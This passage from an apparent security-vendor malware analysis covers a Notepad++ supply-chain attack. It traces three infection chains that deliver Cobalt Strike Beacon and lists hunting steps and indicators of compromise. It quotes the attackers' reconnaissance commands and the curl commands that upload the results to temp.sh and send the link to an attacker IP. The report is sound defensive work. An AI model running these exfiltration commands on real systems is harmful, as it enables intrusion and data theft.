<ol>
<li>The file creates a directory named <code>%appdata%\ProShow</code> and sets it as the current directory;</li>
<li>It executes the shell command <code>cmd /c whoami&amp;&amp;tasklist &gt; 1.txt</code>, thus creating a file with the shell command execution results in the <code>%appdata%\ProShow</code> directory;</li>
<li>Then it uploads the <code>1.txt</code> file to the temp[.]sh hosting service by executing the <code>curl.exe -F "file=@1.txt" -s https://temp.sh/upload</code> command;</li>
<li>Next, it sends the URL to the uploaded <code>1.txt</code> file by using the <code>curl.exe --user-agent "https://temp.sh/ZMRKV/1.txt" -s http://45.76.155[.]202</code> shell command. As can be observed, the uploaded file URL is transferred inside the user agent.</li>
</ol>
<p>Notably, the same behavior of malicious Notepad++ updates, specifically the launch of shell commands and the use of the temp[.]sh website for file uploading, <a href="https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh/3" target="_blank">has been described  on the Notepad++ community forums</a> by a user named soft-parsley.<br>
<a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1.png" alt="" width="2048" height="783" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1.png 2048w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-300x115.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-1024x392.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-768x294.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-1536x587.png 1536w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-915x350.png 915w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-740x283.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-732x280.png 732w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-800x306.png 800w" sizes="auto, (max-width: 2048px) 100vw, 2048px"></a><br>
After sending system information, the <code>update.exe</code> file executes the second-stage payload. To do that, it performs the following actions: </p>
<ul>
<li>Drops the following files to the <code>%appdata%\ProShow</code> directory:
<ul>
<li><code>ProShow.exe</code> (SHA1: defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c)</li>
<li><code>defscr</code> (SHA1: 259cd3542dea998c57f67ffdd4543ab836e3d2a3)</li>
<li><code>if.dnt</code> (SHA1: 46654a7ad6bc809b623c51938954de48e27a5618)</li>
<li><code>proshow.crs</code> (SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709)</li>
<li><code>proshow.phd</code> (SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709)</li>
<li><code>proshow_e.bmp</code> (SHA1: 9df6ecc47b192260826c247bf8d40384aa6e6fd6)</li>
<li><code>load</code> (SHA1: 06a6a5a39193075734a32e0235bde0e979c27228)</li>
</ul>
</li>
<li>Executes the dropped <code>ProShow.exe</code> file.</li>
</ul>
<p>The launched <code>ProShow.exe</code> file is a legitimate ProShow software, which is abused to launch a malicious payload. Normally, when threat actors aim to execute a malicious payload inside a legitimate process, they resort to the DLL sideloading technique. However, this time attackers have decided to avoid using it — likely due to how much attention this technique receives nowadays. Instead, they abused an old, known vulnerability in the ProShow software, which dates back to early 2010s. The dropped file named <code>load</code> contains an exploit payload, which is launched when the <code>ProShow.exe</code> file is launched. It is worth noting that, apart from this payload, all files in the <code>%appdata%\ProShow</code> directory are legitimate.</p>
<p>Analysis of the exploit payload revealed that it contains two shellcodes — one at the very start and the other one in the middle of the file. The shellcode located at the start of the file contains a set of meaningless instructions and is not designed to be executed — rather, attackers used it as the exploit padding bytes. It is likely that, by using a fake shellcode for padding bytes instead of something else (e.g., a sequence of <code>0x41</code> characters or random bytes), attackers aimed to confuse researchers and automated analysis systems. </p>
<p>The second shellcode, which is stored in the middle of the file, is the one that is launched when <code>ProShow.exe</code> is started. It decrypts a Metasploit downloader payload that retrieves a Cobalt Strike Beacon shellcode from the URL https://45.77.31[.]210/users/admin (user agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36) and launches it. </p>
<p>The Cobalt Strike Beacon payload is designed to communicate with the cdncheck.it[.]com C2 server. For instance, it uses the GET request URL https://45.77.31[.]210/api/update/v1 and the POST request URL https://45.77.31[.]210/api/FileUpload/submit.</p>
<p>Later on, in early August 2025, we have observed attackers to use the same download URL for the <code>update.exe</code> files (observed SHA1 hash: 90e677d7ff5844407b9c073e3b7e896e078e11cd), as well as the same execution chain for delivery of Cobalt Strike Beacon via malicious Notepad++ updates. However, we noted the following differences:</p>
<ul>
<li>In the Metasploit downloader payload, the URL for downloading Cobalt Strike Beacon was set to https://cdncheck.it[.]com/users/admin;</li>
<li>The Cobalt Strike C2 server URLs were set to https://cdncheck.it[.]com/api/update/v1 and https://cdncheck.it[.]com/api/Metadata/submit.</li>
</ul>
<p>We have not further seen any infections leveraging chain #1 after early August 2025.</p>
<h3 id="chain-2-middle-and-end-of-september-2025">Chain #2 — middle and end of September 2025</h3>
<p>A month and a half after malicious update detections ceased, we observed attackers to resume deploying these updates in the middle of September 2025, using another infection chain. The malicious update was still being distributed from the http://45.76.155[.]202/update/update.exe URL, and the file downloaded from it (SHA1 hash: 573549869e84544e3ef253bdba79851dcde4963a) was an NSIS installer as well. However, its file size was now about 140 KB. Again, this file performed two actions:</p>
<ul>
<li>Obtained system information by executing a shell command and uploading its execution results to temp[.]sh;</li>
<li>Dropped a next-stage payload on disk and launched it.</li>
</ul>
<p>Regarding system information, attackers made the following changes to how it was collected:</p>
<ul>
<li>They changed the working directory to %APPDATA%\Adobe\Scripts;</li>
<li>They started collecting more system information details, changing the executed shell command to <code>cmd /c "whoami&amp;&amp;tasklist&amp;&amp;systeminfo&amp;&amp;netstat -ano" &gt; a.txt</code>.</li>
</ul>
<p>The created <code>a.txt</code> file was, just as in the case of stage #1, uploaded to the temp[.]sh website through curl, with the obtained temp[.]sh URL being transferred to the same http://45.76.155[.]202/list endpoint, inside the User-Agent header.</p>
<p>As for the next-stage payload, it has been changed completely. The NSIS installer was configured to drop the following files to the %APPDATA%\Adobe\Scripts directory:</p>
<ul>
<li><code>alien.dll</code> (SHA1: 6444dab57d93ce987c22da66b3706d5d7fc226da);</li>
<li><code>lua5.1.dll</code> (SHA1: 2ab0758dda4e71aee6f4c8e4c0265a796518f07d);</li>
<li><code>script.exe</code> (SHA1: bf996a709835c0c16cce1015e6d44fc95e08a38a);</li>
<li><code>alien.ini</code> (SHA1: ca4b6fe0c69472cd3d63b212eb805b7f65710d33).</li>
</ul>
<p>Next, it executes the following shell command to launch the script.exe file: <code>%APPDATA%\%Adobe\Scripts\script.exe %APPDATA%\Adobe\Scripts\alien.ini</code>.</p>
<p>All of the files in the <code>%APPDATA%\Adobe\Scripts</code> directory, except for <code>alien.ini</code>, are legitimate and related to the Lua interpreter. As such, the previously mentioned command is used by attackers to launch a compiled Lua script, located in the <code>alien.ini</code> file.  Below is a screenshot of its decompilation:<br>
<a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072904/notepad-supply-chain-attack-2.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072904/notepad-supply-chain-attack-2.png" alt="" width="560" height="291" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072904/notepad-supply-chain-attack-2.png 560w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072904/notepad-supply-chain-attack-2-300x156.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072904/notepad-supply-chain-attack-2-539x280.png 539w" sizes="auto, (max-width: 560px) 100vw, 560px"></a><br>
As we can see, this small script is used for placing shellcode inside executable memory and then launching it through the <code>EnumWindowStationsW</code> API function.</p>
<p>The launched shellcode is, just in the case of chain #1, a Metasploit downloader, which downloads a Cobalt Strike Beacon payload, again in the form of a shellcode, from the https://cdncheck.it[.]com/users/admin URL.</p>
<p>The Cobalt Strike payload contains the C2 server URLs that slightly differ from the ones seen previously: https://cdncheck.it[.]com/api/getInfo/v1 and https://cdncheck.it[.]com/api/FileUpload/submit.</p>
<p>Attacks involving chain #2 continued until the end of September, when we observed two more malicious <code>update.exe</code> files. One of them had the SHA1 hash 13179c8f19fbf3d8473c49983a199e6cb4f318f0. The Cobalt Strike Beacon payload delivered through it was configured to use the same URLs observed in mid-September, however, attackers changed the way system information was collected. Specifically, attackers split the single shell command they used for this (<code>cmd /c "whoami&amp;&amp;tasklist&amp;&amp;systeminfo&amp;&amp;netstat -ano" &gt; a.txt</code>) into multiple commands:</p>
<ul>
<li><code>cmd /c whoami &gt;&gt; a.txt</code></li>
<li><code>cmd /c tasklist &gt;&gt; a.txt</code></li>
<li><code>cmd /c systeminfo &gt;&gt; a.txt</code></li>
<li><code>cmd /c netstat -ano &gt;&gt; a.txt</code></li>
</ul>
<p>Notably, the same sequence of commands has been previously documented by the soft-parsley user on the Notepad++ community forums.</p>
<p>The other <code>update.exe</code> file had the SHA1 hash 4c9aac447bf732acc97992290aa7a187b967ee2c. Using it, attackers performed the following:</p>
<ul>
<li>Changed the system information upload URL to https://self-dns.it[.]com/list;</li>
<li>Changed the user agent used in HTTP requests to Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36;</li>
<li>Changed the URL used by the Metasploit downloader to https://safe-dns.it[.]com/help/Get-Start;</li>
<li>Changed the Cobalt Strike Beacon C2 server URLs to https://safe-dns.it[.]com/resolve and https://safe-dns.it[.]com/dns-query.</li>
</ul>
<h3 id="chain-3-october-2025">Chain #3 — October 2025</h3>
<p>In early October 2025, attackers changed the infection chain once again. They have as well changed the C2 server for distributing malicious updates, with the observed update URL being http://45.32.144[.]255/update/update.exe. The payload downloaded (SHA1: d7ffd7b588880cf61b603346a3557e7cce648c93) was still a NSIS installer, however, unlike in the case of chains 1 and 2, this installer did not include the system information sending functionality. It simply dropped the following files to the <code>%appdata%\Bluetooth\</code> directory:</p>
<ul>
<li><code>BluetoothService.exe</code>, a legitimate executable (SHA1: 21a942273c14e4b9d3faa58e4de1fd4d5014a1ed);</li>
<li><code>log.dll</code>, a malicious DLL (SHA1: f7910d943a013eede24ac89d6388c1b98f8b3717);</li>
<li><code>BluetoothService</code>, an encrypted shellcode (SHA1: 7e0790226ea461bcc9ecd4be3c315ace41e1c122).</li>
</ul>
<p>This execution chain relies on the sideloading of the <code>log.dll</code> file, which is responsible for launching the encrypted <code>BluetoothService</code> shellcode into the <code>BluetoothService.exe</code> process. Notably, such execution chains are commonly used by Chinese-speaking threat actors. This particular execution chain <a href="https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/" target="_blank">has already been described by Rapid7</a>, and the final payload observed in it is the custom Chrysalis backdoor. </p>
<p>Unlike the previous chains, chain #3 does not load a Cobalt Strike Beacon directly. However, in their article Rapid7 claim that they additionally observed a Cobalt Strike Beacon payload being deployed to the <code>C:\ProgramData\USOShared</code> folder, while conducting incident response on one of the machines infected with the Notepad++ supply chain attack. Whilst Rapid7 does not detail how this file was dropped to the victim machine, we can highlight the following similarities between that Beacon payload and the Beacon payloads observed in chains #1 and #2:</p>
<ol>
<li>In both cases, Beacons are loaded through a Metasploit downloader shellcode, with similar URLs used (api.wiresguard.com/users/admin for the Rapid7 payload, cdncheck.it.com/users/admin and http://45.77.31[.]210/users/admin for chain #1 and chain #2 payloads);</li>
<li>The Beacon configurations are encrypted with the XOR key <code>CRAZY</code>;</li>
<li>Similar C2 server URLs are used for Cobalt Strike Beacon communications (i.e. api.wiresguard.com/api/FileUpload/submit for the Rapid7 payload and https://45.77.31[.]210/api/FileUpload/submit for the chain #1 payload).</li>
</ol>
<h3 id="return-of-chain-2-and-changes-in-urls-october-2025">Return of chain #2 and changes in URLs — October 2025</h3>
<p>In mid-October 2025, we observed attackers to resume deployments of the chain #2 payload (SHA1 hash: 821c0cafb2aab0f063ef7e313f64313fc81d46cd) using yet another URL: http://95.179.213[.]0/update/update.exe. Still, this payload used the previously mentioned self-dns.it[.]com  and safe-dns.it[.]com domain names for system information uploading, Metasploit downloader and Cobalt Strike Beacon communications.</p>
<p>Further in late October 2025, we observed attackers to start changing URLs used for malicious update deliveries. Specifically, attackers started using the following URLs:</p>
<ul>
<li>http://95.179.213[.]0/update/install.exe;</li>
<li>http://95.179.213[.]0/update/update.exe;</li>
<li>http://95.179.213[.]0/update/AutoUpdater.exe.</li>
</ul>
<p>We haven’t observed any new payloads deployed from these URLs — they involved usage of both #2 and #3 execution chains. Finally, we have not seen any payloads being deployed starting from November 2025.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Notepad++ is a text editor used by numerous developers. As such, the ability to control update servers of this software gave attackers a unique possibility to break into machines of high-profile organizations around the world. The attackers made an effort to avoid losing access to this infection vector — they were spreading the malicious implants in a targeted manner, and they were skilled enough to drastically change the infection chains about once a month. Whilst we identified three distinct infection chains during our investigation, we would not be surprised to see more of them in use. To sum up our findings, here is the overall timeline of the infection chains that we identified:<br>
<a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled.png" alt="" width="2578" height="659" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled.png 2578w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-300x77.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-1024x262.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-768x196.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-1536x392.png 1536w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-2048x523.png 2048w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-1370x350.png 1370w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-740x189.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-1096x280.png 1096w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-800x204.png 800w" sizes="auto, (max-width: 2578px) 100vw, 2578px"></a><br>
The variety of infection chains makes detection of the Notepad++ supply chain attack quite a difficult and at the same time creative task. We would like to propose the following methods, from generic to specific, to hunt down traces of this attack:</p>
<ul>
<li>Check systems for deployments of NSIS installers, which have been used in all three observed execution chains. For example, this can be done by looking for logs related to creations of the <code>%localappdata%\Temp\ns.tmp</code> directory, made by NSIS installers at runtime. Make sure to investigate the origins of each identified NSIS installer to avoid false positives;</li>
<li>Check network traffic logs for DNS resolutions of the temp[.]sh domain, which is unusual to observe in corporate environments. Also, it is beneficial to conduct a check for raw HTTP traffic requests that have a temp[.]sh URL embedded in the user agent — both these steps will make it possible to detect chain #1 and chain #2 deployments;</li>
<li>Check systems for launches of malicious shell commands referenced in the article, such as <code>whoami</code>, <code>tasklist</code>, <code>systeminfo</code> and <code>netstat -ano</code>;</li>
<li>Use specific IoCs listed below to identify known malicious domains and files.</li>
</ul>
<h2 id="indicators-of-compromise">Indicators of compromise</h2>
<p>URLs used for malicious Notepad++ update deployments<br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f45.76.155.202%2fupdate%2fupdate.exe/?icid=gl_sl_post-opentip_sm-team_42031260d3146adf&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://45.76.155[.]202/update/update.exe</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f45.32.144.255%2fupdate%2fupdate.exe/?icid=gl_sl_post-opentip_sm-team_f6e6bd04c7eb3fc0&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://45.32.144[.]255/update/update.exe</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f95.179.213.0%2fupdate%2fupdate.exe/?icid=gl_sl_post-opentip_sm-team_4127a336aa8cfcf3&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://95.179.213[.]0/update/update.exe</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f95.179.213.0%2fupdate%2finstall.exe/?icid=gl_sl_post-opentip_sm-team_39007ebfc73652d8&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://95.179.213[.]0/update/install.exe</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f95.179.213.0%2fupdate%2fautoupdater.exe/?icid=gl_sl_post-opentip_sm-team_55921a0acdd3aea5&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://95.179.213[.]0/update/AutoUpdater.exe</a></p>
<p>System information upload URLs<br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f45.76.155.202%2flist/?icid=gl_sl_post-opentip_sm-team_f9995f5431a638c6&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://45.76.155[.]202/list</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fself-dns.it.com%2flist/?icid=gl_sl_post-opentip_sm-team_be7fc69a991908fe&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://self-dns.it[.]com/list</a></p>
<p>URLs used by Metasploit downloaders to deploy Cobalt Strike beacons<br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2f45.77.31.210%2fusers%2fadmin/?icid=gl_sl_post-opentip_sm-team_f0c164ff6f9fd0c5&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://45.77.31[.]210/users/admin</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fcdncheck.it.com%2fusers%2fadmin/?icid=gl_sl_post-opentip_sm-team_907a305f6f4d4462&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://cdncheck.it[.]com/users/admin</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fsafe-dns.it.com%2fhelp%2fget-start/?icid=gl_sl_post-opentip_sm-team_011c47a252117f96&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://safe-dns.it[.]com/help/Get-Start</a></p>
<p>URLs used by Cobalt Strike Beacons delivered by malicious Notepad++ updaters<br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2f45.77.31.210%2fapi%2fupdate%2fv1/?icid=gl_sl_post-opentip_sm-team_b23e939d98d1f956&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://45.77.31[.]210/api/update/v1</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2f45.77.31.210%2fapi%2ffileupload%2fsubmit/?icid=gl_sl_post-opentip_sm-team_7d59bb41bdeb156b&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://45.77.31[.]210/api/FileUpload/submit</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fcdncheck.it.com%2fapi%2fupdate%2fv1/?icid=gl_sl_post-opentip_sm-team_32630cecf516a406&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://cdncheck.it[.]com/api/update/v1</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fcdncheck.it.com%2fapi%2fmetadata%2fsubmit/?icid=gl_sl_post-opentip_sm-team_9df337d2774186bb&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://cdncheck.it[.]com/api/Metadata/submit</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fcdncheck.it.com%2fapi%2fgetinfo%2fv1/?icid=gl_sl_post-opentip_sm-team_dcd0af6bb34cfed4&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://cdncheck.it[.]com/api/getInfo/v1</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fcdncheck.it.com%2fapi%2ffileupload%2fsubmit/?icid=gl_sl_post-opentip_sm-team_7f4b5ffe6e26cb80&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://cdncheck.it[.]com/api/FileUpload/submit</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fsafe-dns.it.com%2fresolve/?icid=gl_sl_post-opentip_sm-team_845673fe6ab5d8c3&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://safe-dns.it[.]com/resolve</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fsafe-dns.it.com%2fdns-query/?icid=gl_sl_post-opentip_sm-team_94921446150c8e8a&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://safe-dns.it[.]com/dns-query</a></p>
<p>URLs used by the Chrysalis backdoor and the Cobalt Strike Beacon payloads associated with it, as previously identified by Rapid7<br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fapi.skycloudcenter.com%2fa%2fchat%2fs%2f70521ddf-a2ef-4adf-9cf0-6d8e24aaa821/?icid=gl_sl_post-opentip_sm-team_9ce93d8d92430d74&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://api.skycloudcenter[.]com/a/chat/s/70521ddf-a2ef-4adf-9cf0-6d8e24aaa821</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fapi.wiresguard.com%2fupdate%2fv1/?icid=gl_sl_post-opentip_sm-team_586b734d80b6d984&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://api.wiresguard[.]com/update/v1</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fapi.wiresguard.com%2fapi%2ffileupload%2fsubmit/?icid=gl_sl_post-opentip_sm-team_2b9f8ccf1ce1d4eb&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://api.wiresguard[.]com/api/FileUpload/submit</a></p>
<p>URLs related to Cobalt Strike Beacons uploaded to multiscanners, as previously identified by Rapid7<br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f59.110.7.32%3a8880%2fuffhxpsy/?icid=gl_sl_post-opentip_sm-team_3fd03c8eefed275e&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://59.110.7[.]32:8880/uffhxpSy</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f59.110.7.32%3a8880%2fapi%2fgetbasicinfo%2fv1/?icid=gl_sl_post-opentip_sm-team_9daab5fed98b43ea&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://59.110.7[.]32:8880/api/getBasicInfo/v1</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f59.110.7.32%3a8880%2fapi%2fmetadata%2fsubmit/?icid=gl_sl_post-opentip_sm-team_30d3646339ec7f6e&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://59.110.7[.]32:8880/api/Metadata/submit</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f124.222.137.114%3a9999%2f3yzr31vk/?icid=gl_sl_post-opentip_sm-team_c983bc45ea61bb40&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://124.222.137[.]114:9999/3yZR31VK</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f124.222.137.114%3a9999%2fapi%2fupdatestatus%2fv1/?icid=gl_sl_post-opentip_sm-team_23af04c4ba5e1df9&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://124.222.137[.]114:9999/api/updateStatus/v1</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f124.222.137.114%3a9999%2fapi%2finfo%2fsubmit/?icid=gl_sl_post-opentip_sm-team_347ca4aa29680b17&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://124.222.137[.]114:9999/api/Info/submit</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fapi.wiresguard.com%2fusers%2fsystem/?icid=gl_sl_post-opentip_sm-team_b7dac3255e6c443e&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://api.wiresguard[.]com/users/system</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fapi.wiresguard.com%2fapi%2fgetinfo%2fv1/?icid=gl_sl_post-opentip_sm-team_faac3436712dbc11&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://api.wiresguard[.]com/api/getInfo/v1</a></p>
<p>Malicious updater.exe hashes<br>
<a href="https://opentip.kaspersky.com/8e6e505438c21f3d281e1cc257abdbf7223b7f5a/results?icid=gl_sl_post-opentip_sm-team_fc3252034d931e04&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">8e6e505438c21f3d281e1cc257abdbf7223b7f5a</a><br>
<a href="https://opentip.kaspersky.com/90e677d7ff5844407b9c073e3b7e896e078e11cd/results?icid=gl_sl_post-opentip_sm-team_14f98790245926cb&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">90e677d7ff5844407b9c073e3b7e896e078e11cd</a><br>
<a href="https://opentip.kaspersky.com/573549869e84544e3ef253bdba79851dcde4963a/results?icid=gl_sl_post-opentip_sm-team_40e174f1dce982d6&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">573549869e84544e3ef253bdba79851dcde4963a</a><br>
<a href="https://opentip.kaspersky.com/13179c8f19fbf3d8473c49983a199e6cb4f318f0/results?icid=gl_sl_post-opentip_sm-team_6dd7c62c0e6bd7a3&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">13179c8f19fbf3d8473c49983a199e6cb4f318f0</a><br>
<a href="https://opentip.kaspersky.com/4c9aac447bf732acc97992290aa7a187b967ee2c/results?icid=gl_sl_post-opentip_sm-team_889e07a195c9b8cf&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">4c9aac447bf732acc97992290aa7a187b967ee2c</a><br>
<a href="https://opentip.kaspersky.com/821c0cafb2aab0f063ef7e313f64313fc81d46cd/results?icid=gl_sl_post-opentip_sm-team_7f543428bd0bfea0&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">821c0cafb2aab0f063ef7e313f64313fc81d46cd</a></p>
<p>Hashes of malicious auxiliary files<br>
<a href="https://opentip.kaspersky.com/06a6a5a39193075734a32e0235bde0e979c27228/results?icid=gl_sl_post-opentip_sm-team_ff1a7c10c4ae9c07&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">06a6a5a39193075734a32e0235bde0e979c27228</a> — load<br>
<a href="https://opentip.kaspersky.com/9c3ba38890ed984a25abb6a094b5dbf052f22fa7/results?icid=gl_sl_post-opentip_sm-team_ed1b61f041a0a199&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">9c3ba38890ed984a25abb6a094b5dbf052f22fa7</a> — load<br>
<a href="https://opentip.kaspersky.com/ca4b6fe0c69472cd3d63b212eb805b7f65710d33/results?icid=gl_sl_post-opentip_sm-team_0efb43831626b598&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">ca4b6fe0c69472cd3d63b212eb805b7f65710d33</a> — alien.ini<br>
<a href="https://opentip.kaspersky.com/0d0f315fd8cf408a483f8e2dd1e69422629ed9fd/results?icid=gl_sl_post-opentip_sm-team_177bef73d2eb98df&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">0d0f315fd8cf408a483f8e2dd1e69422629ed9fd</a> — alien.ini<br>
<a href="https://opentip.kaspersky.com/2a476cfb85fbf012fdbe63a37642c11afa5cf020/results?icid=gl_sl_post-opentip_sm-team_a38d42b29b7189e9&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">2a476cfb85fbf012fdbe63a37642c11afa5cf020</a> — alien.ini</p>
<p>Malicious file hashes, as previously identified by Rapid7<br>
<a href="https://opentip.kaspersky.com/d7ffd7b588880cf61b603346a3557e7cce648c93/results?icid=gl_sl_post-opentip_sm-team_11d36e3202855002&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">d7ffd7b588880cf61b603346a3557e7cce648c93</a><br>
94dffa9de5b665dc51bc36e2693b8a3a0a4cc6b8<br>
21a942273c14e4b9d3faa58e4de1fd4d5014a1ed<br>
